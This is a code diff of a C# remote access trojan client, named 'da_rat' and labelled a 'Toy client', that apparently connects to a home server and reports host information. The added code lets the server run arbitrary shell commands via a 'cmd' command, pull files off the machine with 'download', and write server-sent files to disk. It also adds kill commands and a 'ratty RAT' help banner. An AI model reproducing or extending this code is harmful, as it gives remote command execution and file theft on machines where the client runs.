@@ -1,29 +1,34 @@
-﻿using System;
+﻿
+
+using System;
 using System.Text;
 using System.Net;
 using System.Net.Sockets;
 using System.IO;
 using System.Threading;
+using System.Diagnostics;
+using System.Collections.Generic;
 
 using da_box;
 
-/** [ ] Messaage log query
- *  [ ] Connection retries
- *  [ ] reconnect command
+/** Toy client.
+ * -> Accepts calls from server
+ * -> Handles predefined commands
+ *(-> Some functionality is abstracted away in ToolBhox )
  */
 
 namespace da_rat
 {
     class Rat
     {
-        private static ManualResetEvent _connectDone = new ManualResetEvent(false);
+        // private static ManualResetEvent _connectDone = new ManualResetEvent(false);
 
         private static byte[] _buffer = new byte[2048];
         private static Socket _clientSocket;
 
         private static Box ToolBox = new Box();
 
-
+        /* Personalized Output */
         private static void puts(string text)
         {
             Console.WriteLine(text);
@@ -40,7 +45,6 @@ namespace da_rat
 
             _clientSocket.Close();
             Console.WriteLine("Exiting...");
-            // Console.ReadLine();
         }
 
         private static void SetupClient(string home = "127.0.0.1", int port = 1337, bool retry = false)
@@ -57,6 +61,8 @@ namespace da_rat
             // _connectDone.WaitOne();
         }
 
+        /* Try to connect to the server.
+         * If successful, send hostName and hostAdress to the server */
         private static void ConnectCallback(IAsyncResult AR)
         {
             try
@@ -66,12 +72,14 @@ namespace da_rat
 
                 puts("Socket connected to " + client.RemoteEndPoint.ToString());
 
+                puts(GetSysInfo());
                 SendMessage(GetSysInfo());
 
                 client.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, new AsyncCallback(ReceiveCallback), client);
 
                 // _connectDone.Set();
-            } catch (Exception)
+            }
+            catch (Exception)
             {
                 Console.WriteLine("\n\nRetrying to connect...");
                 Thread.Sleep(TimeSpan.FromSeconds(1));
@@ -88,13 +96,17 @@ namespace da_rat
                 if (socket.Connected)
                 {
                     int received = socket.EndReceive(AR);
-                    string response = "Input was too cheesy";
+                    string response = String.Empty;
 
                     byte[] dataBuf = new byte[received];
                     Array.Copy(_buffer, dataBuf, received);
 
+
+                    /* HANDLE REQUEST */
+
                     string text = Encoding.ASCII.GetString(dataBuf);
 
+                    /* Perform Seppuku */
                     if (text == "kill" || text == "black_plague" || text == "terminate")
                     {
                         Console.WriteLine("Received `kill` command from home.");
@@ -103,16 +115,51 @@ namespace da_rat
                         Environment.Exit(0);
                     }
 
-                    string[] textArr = text.Split();
-                    
-                    if  (textArr[0] == "dir")
+                    /* Break down the received text into a list */
+                    List<string> textArr = new List<string>(text.Split(' '));
+
+                    if  (textArr[0].ToLower() == "dir")
                         response = ToolBox.Dir();
                     
-                    else if (textArr[0] == "cd")
-                        if (!ToolBox.Cd(textArr[1]))    response = "Invalid dir given...";
+                    if (textArr[0].ToLower() == "cd")
+                        if (!ToolBox.Cd(textArr[1]))
+                            response = "Invalid dir given...";
 
-                    else if (textArr[0] == "INFO")
+                    if (textArr[0].ToLower() == "info")
                         response = "OK";
+
+                    if (textArr[0].ToLower() == "cmd")
+                    {
+                        /* Remove 'header', i.e. "CMD" */
+                        text = text.Remove(0, 3);
+
+                        response = "OK\n" + ToolBox.CMD(text);
+                        puts(response);
+                    }
+
+                    if (textArr[0].ToLower() == "download")
+                    {
+                        response = SendFile(textArr[1]);
+                        puts("Sending: " + response);
+                    }
+
+                    /* Check for a file header with a non-empty message, where
+                     *  File header: `FILE fileName headerSize textString`                 */
+                    if (text.ToLower().Split()[0] == "file" && text.ToLower().Split()[2] != "0")
+                    {
+                        /* FILE fileName headerSize ... */
+                        string fileName = text.ToLower().Split()[1]; 
+                        int headerSize = Convert.ToInt32(text.ToLower().Split()[2]);
+                        
+                        string filePath = ToolBox._path + "\\" + fileName;
+                        puts("Trying to wrie to: " + filePath);
+
+                        text = text.Remove(0, headerSize);
+
+                        File.WriteAllText( @filePath, text );
+
+                        text = fileName + " was downloaded locally @ " + filePath;
+                    }
 
                     puts("Pak: " + text);
 
@@ -128,6 +175,7 @@ namespace da_rat
             socket.EndSend(AR);
         }
 
+        /* message -> byteArray -> (send to) server */
         private static void SendMessage(string message)
         {
             byte[] buffer = Encoding.ASCII.GetBytes(message);
@@ -136,6 +184,7 @@ namespace da_rat
             _clientSocket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None,
                 new AsyncCallback(ReceiveCallback), _clientSocket);
         }
+
 
         private static string GetSysInfo()
         {
@@ -155,14 +204,37 @@ namespace da_rat
         }
 
 
-        private static void SendFile(string file)
+        private static string SendFile(string file)
         {
             string response = "FILE " + file + " ";
-            response += ToolBox.FileToByte(file);
+            return response += ToolBox.FileToString(file);
 
             /* FILE fileName headerSize ... */
-            SendMessage(response);
+            // SendMessage(response);
         }
+
+        private static string _help = @"
+               __    __          
+____________ _/  |__/  |_ ___.__.
+\_  __ \__  \\   __\   __<   |  |
+ |  | \// __ \|  |  |  |  \___  |
+ |__|  (____  /__|  |__|  / ____|
+            \/            \/     
+_________________________________
+__________    ________________   
+\______   \  /  _  \__    ___/   
+ |       _/ /  /_\  \|    |      
+ |    |   \/    |    \    |      
+ |____|_  /\____|__  /____|      
+        \/         \/            
+Commands:
+    help
+
+    connect `or` reconnect
+
+    break `or` exit
+
+";
 
         private static void SendLoop()
         {
@@ -171,17 +243,21 @@ namespace da_rat
                 Console.Write("> ");
                 string req = Console.ReadLine().Trim();
 
-                if (req == "break" || req == "exit")
-                    break;
-                
-                else if (req == "connect" || req == "reconnect")
-                    SetupClient(retry: true);
+                    if (req == "break" || req == "exit")
+                        break;
 
-                else if (req == "disconnect")
-                    _clientSocket.Close();
+                    if (req == "help")
+                        puts(_help);
+                    
+                    else if (req == "connect" || req == "reconnect")
+                        SetupClient(retry: true);
 
-                else
-                    SendMessage(req);
+                    else if (req == "disconnect")
+                        _clientSocket.Close();
+
+                    else
+                        if (_clientSocket.Connected)
+                            SendMessage(req);
             }
         }
     }
